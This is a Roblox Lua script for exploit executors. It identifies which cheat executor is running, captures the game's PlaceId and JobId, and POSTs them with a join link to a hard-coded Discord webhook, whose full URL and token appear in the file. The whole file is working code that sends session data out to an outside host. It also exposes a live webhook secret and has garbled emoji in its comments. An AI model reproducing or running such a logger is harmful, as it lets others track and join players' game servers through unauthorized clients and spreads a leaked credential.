local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- üîç Executor detection
local executor = "Unknown"
pcall(function()
    if identifyexecutor then executor = identifyexecutor()
    elseif syn then executor = "Synapse X"
    elseif fluxus then executor = "Fluxus"
    elseif KRNL_LOADED then executor = "Krnl"
    elseif is_sirhurt_closure then executor = "SirHurt"
    elseif getexecutorname then executor = getexecutorname()
    elseif WRD_LOADED then executor = "WeAreDevs"
    elseif isexecutorclosure then executor = "Script-Ware"
    elseif electron then executor = "Electron"
    end
end)

-- üåê Webhook + JobId
local webhook = "https://discord.com/api/webhooks/1420513049025970397/As4wF1pwwmf9-HdwSsaRC6X5lLPikZWzidNeRRPaJsSfmwLJ0nLqyXci-AwVAZL1dFWx"
local placeId = game.PlaceId
local jobId = game.JobId
local redirectLink = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", placeId, jobId)

-- üß† Passive JobId check (no teleport)
local function isLikelyJoinable()
    return typeof(jobId) == "string" and #jobId > 10
end

-- ‚úÖ If valid, send to Discord
if isLikelyJoinable() then
    local payload = {
        content = "**üì° JobId Sniffed:** `" .. jobId .. "`\n" ..
                  "**üß† Executor Used:** `" .. executor .. "`\n" ..
                  "**üöÄ Click to Join:** <" .. redirectLink .. ">"
    }

    local request = http_request or syn.request or request or fluxus.request
    if request then
        pcall(function()
            request({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    else
        warn("‚ùå No compatible request function found.")
    end
else
    warn("‚ùå JobId looks invalid. Skipping log.")
end
